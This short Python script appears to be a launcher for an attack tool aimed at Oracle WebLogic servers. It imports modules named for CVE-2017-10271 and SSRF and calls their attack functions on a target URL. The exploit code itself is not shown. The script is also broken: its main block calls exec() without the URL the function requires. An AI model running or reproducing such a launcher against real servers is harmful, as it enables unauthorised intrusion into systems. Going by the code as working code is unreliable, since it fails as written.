# -*- coding: utf-8 -*-
import os
import weblogic.CVE_2017_10271
import weblogic.ssrf

def exec(URL):
    weblogic.CVE_2017_10271.attack(URL)
    weblogic.ssrf.attack(URL)




if __name__ == "__main__":
    exec()
